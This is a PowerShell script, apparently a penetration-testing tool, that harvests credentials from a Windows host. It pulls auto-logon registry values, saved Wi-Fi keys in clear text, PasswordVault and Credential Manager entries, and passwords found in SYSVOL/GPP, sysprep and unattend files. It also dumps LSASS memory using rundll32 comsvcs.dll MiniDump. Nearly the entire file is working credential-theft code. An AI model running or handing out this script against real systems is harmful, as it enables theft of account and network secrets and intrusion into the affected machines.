<#
    .SYNOPSIS
        Extracts Windows Credentials using PowerShell.

    .DESCRIPTION
        -   PowerShell script to extract credentials from local Windows hosts without downloading external tools. 
        -   Searches common Windows locations for stored credentials, also can dump LSASS process to you current working directory

    .NOTES
        File Name: Xtract_win.ps1
        Last Updated: 8/24/2021
        Author: Mike Wurz
#>

Write-Host
"
 __   ___                  _              _       
 \ \ / / |                | |            (_)      
  \ V /| |_ _ __ __ _  ___| |_  __      ___ _ __  
   > < | __| '__/ _` |/ __| __| \ \ /\ / / | '_ \ 
  / . \| |_| | | (_| | (__| |_   \ V  V /| | | | |
 /_/ \_\\__|_|  \__,_|\___|\__|   \_/\_/ |_|_| |_|
 "

#Search registry for auto-logon credentials
Write-Host "Searching for Auto-Logon credentials" -ForegroundColor Yellow
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon' | Select-Object "Default*"

#Check for LSASS WDigest caching
Write-Host "Searching for LSASS WDigest cached credentials" -ForegroundColor Yellow
(Get-ItemProperty registry::HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest).UseLogonCredential

#Credentials in SYSVOL and Group Policy Preferences (GPP)
$Have_AD = Read-Host "Does target have AD & GPO (y/n)? "
if ($Have_AD -eq "y") 
    {
        $domain = Read-Host "What is the client's Fully Qualified domain name (ex. burgertown.domain.local): "
        Write-Host "Searching for credentials in SYSVOL & GPP" -ForegroundColor Yellow -BackgroundColor DarkGray
        Push-Location \\$domain\sysvol
        Get-ChildItem * -Include *.xml,*.txt,*.bat,*.ps1,*.psm,*.psd -Recurse -EA SilentlyContinue | select-string password
        Pop-Location
    }
else { Write-host "y was not entered, skipping over SYSVOL & GPP search" }

#Get stored Wi-Fi passwords from Wireless Profiles
Write-Host "Searching for Wireless Profiles for Wi-Fi passwords" -ForegroundColor Yellow
(netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize

#Get stored passwords from Windows PasswordVault
Write-host "Searching Windows PasswordVault for credentials" -ForegroundColor Yellow
[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | ForEach-Object { $_.RetrievePassword();$_ }

#Get stored passwords from Windows Credential Manager
Write-Host "Searching Windows Credential Manager for credentials" -ForegroundColor Yellow
#Install-Module -Name CredentialManager	
$Cred = Get-StoredCredential -AsCredentialObject -
$cred | Select-Object TargetName, UserName, Password, PaswordSize, LastWritten, Comment

#Dump passwords from Google Chrome browser
Write-Host "Searching Google Chrome objects for passwords" -ForegroundColor Yellow
#[System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($datarow.password_value,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser))

#Search for SNMP community string in registry
Write-Host "Searching registry for SNMP community strings" -ForegroundColor Yellow
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse -EA SilentlyContinue

#Dumping LSASS
$answer= Read-Host -Prompt "Would you like to dump LSASS (y/n)? "
if($answer -eq "y") 
    {
        Write-Host "Dumping LSASS to current working directory" -ForegroundColor Cyan
        $ID = Get-Process -Name LSASS
        C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $id.Id lsass.dmp full

    }
else {Write-Host "NOT dumping LSASS"}

#Search for string pattern in registry
$answer= Read-Host -Prompt "Would you like to search registry for credentials, could take a while (y/n)? "
if($answer -eq "y") 
    {
        Write-Host "Searching registry for credentials...may take a while" -ForegroundColor Yellow
        $pattern = "password"
        $hives = "HKEY_CLASSES_ROOT","HKEY_CURRENT_USER","HKEY_LOCAL_MACHINE","HKEY_USERS","HKEY_CURRENT_CONFIG"
        foreach ($r in $hives) { Get-ChildItem "registry::${r}\" -rec -ea SilentlyContinue | Select-String "$pattern" }
        foreach ($r in $hives) { Get-ChildItem "registry::${r}\" -rec -ea SilentlyContinue | ForEach-Object { if((Get-ItemProperty $_.PsPath -ea SilentlyContinue) -match "$pattern") { $_.PsPath; $_ | out-string -stream | Select-String "$pattern" }}}
    }
else {Write-Host "Not searching registry for credentials"}

#Find credentials in Sysprep or Unattend files
$answer= Read-Host -Prompt "Would you like to search C:\ for sysprep and unattend files, could take a while (y/n)? " 
if($answer -eq "y") 
    {
        Write-Host "Searching sysprep and unattend files for credentials" -ForegroundColor Yellow
        Get-ChildItem c:\ -Include *sysprep.inf,*sysprep.xml,*sysprep.txt,*unattended.xml,*unattend.xml,*unattend.txt -File -Recurse -EA SilentlyContinue
    }
else { Write-host "Not searching for sysprep and unattend files" }
